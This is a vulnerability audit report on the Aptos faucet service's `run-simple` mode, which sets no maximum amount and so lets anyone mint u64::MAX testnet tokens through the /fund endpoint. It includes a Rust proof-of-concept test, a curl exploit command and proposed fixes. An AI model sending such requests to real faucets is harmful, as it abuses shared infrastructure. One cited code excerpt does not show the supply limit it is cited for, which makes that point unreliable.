# Audit Report

## Title
Unlimited Token Minting via Faucet Service Due to Missing Maximum Amount Enforcement

## Summary
The Aptos faucet service, when started with the `run-simple` command (the documented primary deployment method), sets `maximum_amount: None` in its transaction configuration. This allows any unauthenticated user to request and receive arbitrary amounts of tokens (up to u64::MAX ≈ 184 billion APT) via the public `/fund` HTTP endpoint, enabling massive inflation attacks on test networks.

## Finding Description

The vulnerability exists in the faucet service's configuration system. When examining the code flow:

**1. Service Configuration**: The `build_for_cli()` function creates a faucet service configuration with no maximum amount limit: [1](#0-0) 

**2. User-Controlled Amount**: The `/fund` endpoint accepts a user-provided amount with no validation: [2](#0-1) 

**3. Amount Processing Logic**: When `maximum_amount` is `None`, the `get_amount()` function returns the full user-requested amount without any cap: [3](#0-2) 

The critical line is 546 where `(Some(amount), None) => amount` returns the user's requested amount directly when no maximum is configured.

**4. Documentation Recommendation**: The README explicitly recommends `run-simple` as "the simplest way to start" the faucet: [4](#0-3) 

**5. On-Chain Protections Are Insufficient**: The on-chain supply limit is set to MAX_U128 during initialization, which provides no practical protection against u64 amounts: [5](#0-4) 

**Attack Path**:
1. Attacker identifies a faucet running with `run-simple` (common on public testnets)
2. Attacker sends: `POST /fund { "amount": 18446744073709551615, "address": "0xattacker" }`
3. Server processes the request via `MintFunder::fund()` → `get_amount()` → returns full amount
4. Minting transaction executes for 18,446,744,073,709,551,615 OCTA (≈184 billion APT)
5. Attacker can repeat this indefinitely to cause unlimited inflation

## Impact Explanation

**Severity: HIGH (potentially CRITICAL on production testnets)**

This vulnerability meets the **High Severity** criteria per the Aptos bug bounty program:
- **Significant protocol violation**: Allows bypassing intended economic limits on token distribution
- **Limited funds loss or manipulation**: While test networks don't have "real" monetary value, this completely breaks the intended faucet economics and could render testnets unusable

The impact escalates to **CRITICAL** if:
- Any production testnet uses this configuration (which the README suggests is the standard deployment method)
- The inflated tokens can be used to DoS the network through storage/gas exhaustion
- This configuration is accidentally deployed on mainnet infrastructure

**Invariants Broken**:
- **Resource Limits** (Invariant #9): All operations must respect configured limits - the missing `maximum_amount` violates this
- **Access Control** (Invariant #8): The faucet should control token distribution, but lack of limits grants unrestricted minting to anyone

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to occur because:

1. **Default Configuration**: The README shows `run-simple` as the primary deployment method with no warnings about security implications
2. **No Authentication Required**: The attack requires only HTTP access - no special credentials or insider access needed
3. **Trivial Exploitation**: Attack complexity is minimal - a single HTTP POST request with a large `amount` value
4. **Wide Deployment**: Testnets and development environments commonly use this simplified setup
5. **No Rate Limiting**: The `run-simple` configuration includes no checkers or bypassers, so no rate limiting exists

The only factor reducing likelihood is that this primarily affects test networks rather than mainnet, but operational disruption to testnets is still significant.

## Recommendation

**Immediate Fix**: Set a reasonable default `maximum_amount` in the `build_for_cli()` function: [1](#0-0) 

Recommended change:
```rust
transaction_submission_config: TransactionSubmissionConfig::new(
    Some(100_000_000_000),  // maximum_amount: 100 APT (100B OCTA)
    None,                    // maximum_amount_with_bypass
    // ... rest unchanged
```

**Additional Hardening**:
1. Add validation in `FundRequest` to reject amounts above a sanity threshold (e.g., 1000 APT)
2. Update documentation to warn about security implications of `None` values
3. Consider making `maximum_amount` a required parameter for `run-simple` command
4. Add a `--maximum-amount` CLI flag with a safe default

## Proof of Concept

```rust
// Integration test demonstrating the vulnerability
#[tokio::test]
async fn test_unlimited_minting_exploit() {
    use reqwest;
    use serde_json::json;
    
    // Start faucet with run-simple (simulated)
    let faucet_url = "http://127.0.0.1:8081"; // Default port from run-simple
    
    // Attacker crafts request for maximum u64 amount
    let malicious_request = json!({
        "amount": 18446744073709551615u64, // u64::MAX
        "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
    });
    
    // Send exploit request
    let client = reqwest::Client::new();
    let response = client
        .post(&format!("{}/fund", faucet_url))
        .json(&malicious_request)
        .send()
        .await
        .expect("Failed to send request");
    
    // Verify the attack succeeds
    assert_eq!(response.status(), 200);
    
    let fund_response: serde_json::Value = response.json().await.unwrap();
    println!("Minted ~184 billion APT: {:?}", fund_response);
    
    // The faucet will mint the full requested amount with no limits
    // This can be repeated indefinitely for unlimited inflation
}
```

**Reproduction Steps**:
1. Start local testnet: `cargo run -p aptos -- node run-local-testnet`
2. Start faucet with run-simple: `cargo run -p aptos-faucet-service -- run-simple --key ~/.aptos/testnet/mint.key --node-url http://127.0.0.1:8080 --chain-id TESTING`
3. Send malicious request: `curl -X POST http://127.0.0.1:8081/fund -H "Content-Type: application/json" -d '{"amount": 18446744073709551615, "address": "0xYOUR_ADDRESS"}'`
4. Observe that the full amount is minted without any cap

## Notes

While the security question specifically asks about the CLI tool (`crates/aptos-faucet/cli/src/main.rs`), the more critical vulnerability is in the **service** configuration via `build_for_cli()`. The CLI tool itself is less concerning since it requires privileged access (mint key file) and is intended for operator use. However, the service exposes this same configuration flaw to unauthenticated public users via HTTP endpoints, making it exploitable by any attacker.

The on-chain supply limit of MAX_U128 provides no meaningful protection since it's astronomically higher than any realistic funding amount. The only effective limit must be enforced at the faucet application layer through the `maximum_amount` configuration parameter.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L285-287)
```rust
                transaction_submission_config: TransactionSubmissionConfig::new(
                    None,    // maximum_amount
                    None,    // maximum_amount_with_bypass
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L32-37)
```rust
#[derive(Clone, Debug, Default, Object)]
pub struct FundRequest {
    /// If not set, the default is the preconfigured max funding amount. If set,
    /// we will use this amount instead assuming it is < than the maximum,
    /// otherwise we'll just use the maximum.
    pub amount: Option<u64>,
```

**File:** crates/aptos-faucet/core/src/funder/mint.rs (L540-550)
```rust
    fn get_amount(&self, amount: Option<u64>, did_bypass_checkers: bool) -> u64 {
        match (
            amount,
            self.txn_config.get_maximum_amount(did_bypass_checkers),
        ) {
            (Some(amount), Some(maximum_amount)) => std::cmp::min(amount, maximum_amount),
            (Some(amount), None) => amount,
            (None, Some(maximum_amount)) => std::cmp::min(self.amount_to_fund, maximum_amount),
            (None, None) => self.amount_to_fund,
        }
    }
```

**File:** crates/aptos-faucet/README.md (L32-41)
```markdown
To run the faucet, the simplest way to start is with this command:
```
cargo run -p aptos-faucet-service -- run-simple --key <private_key> --node-url <api_url> --chain-id TESTING
```

Another example, running alongside a localnet (without `--use-faucet`):
```
cargo run -p aptos -- node run-local-testnet --force-restart --assume-yes
cargo run -p aptos-faucet-service -- run-simple --key ~/.aptos/testnet/mint.key --node-url http://127.0.0.1:8080 --chain-id TESTING
```
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L1086-1091)
```text
            supply: if (monitor_supply) {
                option::some(optional_aggregator::new(parallelizable))
            } else {
                option::none()
            }
        };
```
